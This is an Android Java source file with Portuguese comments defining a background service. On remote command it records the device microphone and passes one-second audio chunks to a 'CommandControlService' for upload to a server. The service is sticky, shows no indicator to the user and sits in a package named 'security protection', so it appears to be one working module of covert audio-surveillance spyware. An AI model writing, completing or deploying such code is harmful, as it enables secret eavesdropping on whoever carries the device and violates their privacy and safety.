package com.seguranca.protecao;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.IOException;

/**
 * 🎤 SERVIÇO DE MICROFONE EM TEMPO REAL
 * 
 * Captura áudio do microfone e envia para o servidor.
 */
public class MicrophoneService extends Service {
    private static final String TAG = "MicrophoneService";
    
    private static final int SAMPLE_RATE = 16000; // 16kHz
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;
    private static final int BUFFER_SIZE = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);
    
    private AudioRecord audioRecord;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private boolean isRecording = false;
    private Thread recordingThread;
    
    private BroadcastReceiver micReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            boolean enabled = intent.getBooleanExtra("enabled", false);
            Log.d(TAG, "🎤 Comando recebido: " + (enabled ? "ATIVAR" : "DESATIVAR"));
            
            if (enabled) {
                startCapture();
            } else {
                stopCapture();
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🎤 MicrophoneService criado");
        
        // Registra receiver
        IntentFilter filter = new IntentFilter("com.seguranca.protecao.TOGGLE_MICROPHONE");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(micReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(micReceiver, filter);
        }
        
        startBackgroundThread();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("MicrophoneBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Erro ao parar thread: " + e.getMessage());
            }
        }
    }

    private void startCapture() {
        if (isRecording) {
            Log.w(TAG, "⚠️ Já está gravando!");
            return;
        }
        
        try {
            Log.d(TAG, "🎤 Iniciando captura de áudio...");
            
            // Inicializa AudioRecord
            audioRecord = new AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                CHANNEL_CONFIG,
                AUDIO_FORMAT,
                BUFFER_SIZE * 2
            );
            
            if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "❌ Falha ao inicializar AudioRecord");
                return;
            }
            
            audioRecord.startRecording();
            isRecording = true;
            
            // Inicia thread de captura
            recordingThread = new Thread(new AudioCaptureRunnable());
            recordingThread.start();
            
            Log.d(TAG, "✅ Captura de áudio iniciada!");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao iniciar captura: " + e.getMessage());
        }
    }

    private void stopCapture() {
        Log.d(TAG, "🎤 Parando captura...");
        isRecording = false;
        
        if (audioRecord != null) {
            try {
                if (audioRecord.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING) {
                    audioRecord.stop();
                }
                audioRecord.release();
            } catch (Exception e) {
                Log.e(TAG, "Erro ao liberar AudioRecord: " + e.getMessage());
            }
            audioRecord = null;
        }
        
        if (recordingThread != null) {
            try {
                recordingThread.join(1000);
            } catch (InterruptedException e) {
                Log.e(TAG, "Erro ao parar thread: " + e.getMessage());
            }
            recordingThread = null;
        }
    }

    private class AudioCaptureRunnable implements Runnable {
        private long lastSendTime = 0;
        private static final long SEND_INTERVAL = 1000; // 1 segundo entre envios
        
        @Override
        public void run() {
            short[] buffer = new short[BUFFER_SIZE];
            ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
            
            while (isRecording && audioRecord != null) {
                try {
                    int read = audioRecord.read(buffer, 0, buffer.length);
                    
                    if (read > 0) {
                        // Converte short[] para byte[]
                        byte[] audioBytes = new byte[read * 2];
                        for (int i = 0; i < read; i++) {
                            audioBytes[i * 2] = (byte) (buffer[i] & 0xFF);
                            audioBytes[i * 2 + 1] = (byte) ((buffer[i] >> 8) & 0xFF);
                        }
                        
                        // Acumula dados
                        byteStream.write(audioBytes);
                        
                        // Envia a cada 1 segundo
                        long now = System.currentTimeMillis();
                        if (now - lastSendTime > SEND_INTERVAL) {
                            byte[] data = byteStream.toByteArray();
                            if (data.length > 0) {
                                sendAudioToServer(data);
                                byteStream.reset();
                            }
                            lastSendTime = now;
                        }
                    }
                    
                    // Pequeno delay para evitar uso excessivo de CPU
                    Thread.sleep(10);
                    
                } catch (Exception e) {
                    Log.e(TAG, "❌ Erro na captura de áudio: " + e.getMessage());
                    break;
                }
            }
            
            // Envia dados restantes
            try {
                byte[] data = byteStream.toByteArray();
                if (data.length > 0) {
                    sendAudioToServer(data);
                }
                byteStream.close();
            } catch (IOException e) {
                Log.e(TAG, "Erro ao fechar stream: " + e.getMessage());
            }
        }
    }

    private void sendAudioToServer(byte[] audioData) {
        // Envia para CommandControlService
        Intent intent = new Intent("com.seguranca.protecao.AUDIO_CHUNK_READY");
        intent.setPackage(getPackageName());
        intent.putExtra("audio", audioData);
        sendBroadcast(intent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "🎤 MicrophoneService destruído");
        
        stopCapture();
        stopBackgroundThread();
        
        try {
            unregisterReceiver(micReceiver);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao desregistrar receiver: " + e.getMessage());
        }
    }
}
